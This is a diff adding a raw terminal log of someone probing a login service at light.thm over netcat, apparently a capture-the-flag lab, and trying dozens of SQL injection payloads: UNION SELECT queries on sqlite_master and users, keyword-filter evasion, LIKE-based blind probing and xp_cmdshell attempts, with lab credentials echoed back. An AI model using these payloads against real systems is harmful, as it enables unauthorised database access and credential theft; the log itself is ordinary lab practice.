@@ -1,0 +1,288 @@
+Script started on 2025-01-18 17:23:19+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: smokey
+Password: vYQ5ngPpw8AdUmL
+Please enter your username: smokey
+Password: vYQ5ngPpw8AdUmL
+Please enter your username: ^C
+
+Script done on 2025-01-18 17:23:56+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-18 17:24:56+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/2" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: admin
+Username not found.
+Please enter your username: root
+Username not found.
+Please enter your username: ^C
+
+Script done on 2025-01-18 17:25:10+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-19 17:06:03+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+
+^C
+
+Script done on 2025-01-19 17:06:12+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-19 17:06:30+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+^C
+
+Script done on 2025-01-19 17:06:36+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-19 17:06:38+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+^C
+
+Script done on 2025-01-19 17:06:39+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-19 17:07:17+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Username not found.
+Please enter your username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Username not found.
+Please enter your username: admin
+Username not found.
+Please enter your username: smokey
+Password: vYQ5ngPpw8AdUmL
+Please enter your username: ^C
+
+Script done on 2025-01-19 17:08:29+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-19 17:13:41+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: admin       admin' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: ; ls
+Username not found.
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database();--
+For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema=database()
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, CONCAT(username, ':', password) FROM users
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, CONCAT(key, ':', value) FROM credentials
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, table_name FROM sqlite_master WHERE type='table'
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, 'users'
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, 'credentials'
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, 'admin'
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, username || ':' || password FROM users
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, username FROM users
+Ahh there is a word in there I don't like :(
+Please enter your username: ^C
+admin' OR '1'='1' UNION SELECT NULL, column1 FROM users
+Script done on 2025-01-19 17:16:49+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-19 17:16:53+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, column1 FROM users
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' AND 1=1
+Error: unrecognized token: "' LIMIT 30"
+Please enter your username: admin' OR '1'='1' AND SUBSTR((SELECT username FROM users LIMIT 1), 1, 1)='a'
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' #
+Error: unrecognized token: "#"
+Please enter your username: admin' OR '1'='1' --
+For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+Please enter your username: admin' OR '1'='1' LIMIT 1 OFFSET 0
+Error: unrecognized token: "' LIMIT 30"
+Please enter your username: admin' OR '1'='1'
+Error: unrecognized token: "'1'' LIMIT 30"
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, table_name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, username FROM users LIMIT 1 OFFSET 0
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, password FROM users LIMIT 1 OFFSET 0
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, username FROM users
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqli'||'te_%'
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, name FROM sqlite_master WHERE type='table' AND hex(name) NOT LIKE hex('sqlite%')
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, name FROM pragma_table_list
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, 'users'
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, username FROM us'||'ers LIMIT 1 OFFSET 0
+Ahh there is a word in there I don't like :(
+Please enter your username: ^[[A    admin' OR '1'='1' UNION SELECT NULL, username FROM us'||'ers LIMIT 1 OFFSET 0^[[D                                              ^C
+
+Script done on 2025-01-19 17:21:26+03:00 [COMMAND_EXIT_CODE="1"]
+Script started on 2025-01-19 17:21:30+03:00 [COMMAND="nc light.thm 1337" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+Welcome to the Light database!
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, username FROM users
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, username FROM users                     
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, username FROM users                                        
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR '1'='1' UNION SELECT NULL, username FROM users                                       
+Error: unrecognized token: "'1'' LIMIT 30"
+Please enter your username: 'UNION SELECT NULL,NULL,NULL -- -
+For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+Please enter your username: 'UNION SELECT NULL,NULL,NULL -- -
+For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+Please enter your username: ' UNION SELECT NULL,NULL,NULL LIMIT 1
+Ahh there is a word in there I don't like :(
+Please enter your username: ' UNION SELECT NULL UNION SELECT NULL UNION SELECT NULL LIMIT 1
+Ahh there is a word in there I don't like :(
+Please enter your username: or true--
+For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+Please enter your username: admin') or ('1'='1'#
+Error: near ")": syntax error
+Please enter your username: admin' OR '1'='1'#
+Error: unrecognized token: "#"
+Please enter your username: admin') or ('1'='1'/
+Error: near ")": syntax error
+Please enter your username: admin') or ('1'='1'/              
+Error: unrecognized token: "'admin'' LIMIT 30"
+Please enter your username: admin' OR '1'='1' LIMIT 30
+Error: unrecognized token: "' LIMIT 30"
+Please enter your username: admin' UNION SELECT NULL, password FROM password--
+For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+Please enter your username: smokey' AND 1=1
+Error: unrecognized token: "' LIMIT 30"
+Please enter your username: admin' UNION SELECT NULL, username || ':' || password FROM password
+Ahh there is a word in there I don't like :(
+Please enter your username: smokey' AND 1=1--
+For strange reasons I can't explain, any input containing /*, -- or, %0b is not allowed :)
+Please enter your username: smokey' AND 1=1
+Error: unrecognized token: "' LIMIT 30"
+Please enter your username: light
+Username not found.
+Please enter your username: light   AND = 1=1'
+Error: unrecognized token: "'light AND 1=1'' LIMIT 30"
+Please enter your username: light
+Username not found.
+Please enter your username: admin
+Username not found.
+Please enter your username: test
+Username not found.
+Please enter your username: user
+Username not found.
+Please enter your username: username
+Username not found.
+Please enter your username: admin' AND 1=1
+Error: unrecognized token: "' LIMIT 30"
+Please enter your username: admin' OR '1'='1'
+Error: unrecognized token: "'1'' LIMIT 30"
+Please enter your username: |
+Username not found.
+Please enter your username: test|
+Username not found.
+Please enter your username: UNIONS
+Ahh there is a word in there I don't like :(
+Please enter your username: UNIONS
+Ahh there is a word in there I don't like :(
+Please enter your username: UNION
+Ahh there is a word in there I don't like :(
+Please enter your username: SELECT
+Ahh there is a word in there I don't like :(
+Please enter your username: WHERE
+Username not found.
+Please enter your username: users
+Username not found.
+Please enter your username: admin' AND 1=2
+Error: unrecognized token: "' LIMIT 30"
+Please enter your username: admin' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: ASCII
+Username not found.
+Please enter your username: SUBSTRING
+Username not found.
+Please enter your username: admin' OR ASCII(SUBSTRING(password, 1, 1)) = 116
+Error: unrecognized token: "' LIMIT 30"
+Please enter your username: admin' OR CHAR(116, 102) = 'tf'
+Error: unrecognized token: "'tf'' LIMIT 30"
+Please enter your username: admin' OR (1=1 AND ASCII(SUBSTRING(password, 1, 1)) = 116) -- check the first character of password                                                   
+Error: unrecognized token: "' LIMIT 30"
+Please enter your username: admin' OR '1'='1OR ASCII(SUBSTRING(password, 1, 1)) = 116
+Username not found.
+Please enter your username: admin' OR '1'='1^[[D             OR ASCII(SUBSTRING(password, 1, 1)) = 116 ORT  '1'='1
+Error: no such function: SUBSTRING
+Please enter your username: admin' HAR(116, 102) = 'tf'^[[D                        CHAR(116, 102) = 'tf' OR '1'='1
+Error: near "CHAR": syntax error
+Please enter your username: admin' SELECT * from users OR '1'='1
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' OR (ASCII(SUBSTRING(password, 1, 1)) = 116) OR '1'='1
+Error: no such function: SUBSTRING
+Please enter your username: admin' OR password LIKE 't%' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR users LIKE 't%' OR '1'='1
+Error: no such column: users
+Please enter your username: admin' OR username LIKE 't%' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR password LIKE '_f%' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR username LIKE '%id%' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: smokey
+Password: vYQ5ngPpw8AdUmL
+Please enter your username: smoek  key' OR username LIKE '%id%' OR '1'1 ='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' OR username LIKE '%password%' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' AND username LIKE '%password%' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' GROUP BY username OR '1'='1
+Username not found.
+Please enter your username: admin'      '
+Error: unrecognized token: "''' LIMIT 30"
+Please enter your username: ' GROUP BY username
+Error: unrecognized token: "' LIMIT 30"
+Please enter your username: ' GROUP BY username OR '1'='1
+Username not found.
+Please enter your username: admin' id=1 OR '1'1 ='1
+Error: near "id": syntax error
+Please enter your username: admin' username='smokey' OR '1'='1
+Error: near "username": syntax error
+Please enter your username: admin' AND username='smokey' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' AND (SELECT non_existent_function()) OR '1'='1
+Ahh there is a word in there I don't like :(
+Please enter your username: admin' GROUP BY version HAVING COUNT(*) > 0 OR '1'='1
+Error: no such column: version
+Please enter your username: admin' GROUP BY version HAVING COUNT(*) > 0                                      GROUP BY username HAVING COUNT(*) > 0 OR '1'='1
+Username not found.
+Please enter your username: admin' GROUP BY password HAVING COUNT(*) > 0 OR '1'='1
+Username not found.
+Please enter your username: admin' id=1 HAVING OR '1'='1
+Error: near "id": syntax error
+Please enter your username: admin' GROUP BY id HAVING 1=1 OR '1'1 ='1
+Username not found.
+Please enter your username: admin' ANBD  D password='tF8tj2o94WE4LKC' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: smokey
+Password: vYQ5ngPpw8AdUmL
+Please enter your username: adni  min' password='vYQ5ngPpw8AdUmL' OR '1'='1
+Error: near "password": syntax error
+Please enter your username: admin' AND password='vYQ5ngPpw8AdUmL' OR '1'='1
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin'
+Error: unrecognized token: "'admin'' LIMIT 30"
+Please enter your username: admin OR 'A'='A'
+Error: near "A": syntax error
+Please enter your username: admin' OR 'A'='A
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' AND FROM_BASE64('U0VMRUNUICogRlJPTSB1c2VybmFtZQo=') OR 'A'='A
+Error: no such function: FROM_BASE64
+Please enter your username: admin' AND UNHEX('rerterter') OR 'A'='A
+Error: no such function: UNHEX
+Please enter your username: admin' AND CHAR(32) OR 'A'='A
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' AND CHAR(83,69,76,69,67,84,32,42,32,70,82,79,77,32,117,115,101,114,110,97,109,101) OR 'A'='A
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' AND CHAR(83,69,76,69,67,84,32,42,32,70,82,79,77,32,117,115,101,114,110,97,109,101) OR 'A'='A
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' AND CHAR(83,69,76,69,67,84,32,112,97,115,115,119,111,114,100) OR 'A'='A
+Password: tF8tj2o94WE4LKC
+Please enter your username: admin' AND   EXEC xp_cmdshell('ls'); OR 'A'='A
+Error: near "EXEC": syntax error
+Please enter your username: q admin' ; EXEC xp_cmdshell('ls'); OR 'a'='a
+^C
+
+Script done on 2025-01-19 18:14:05+03:00 [COMMAND_EXIT_CODE="1"]
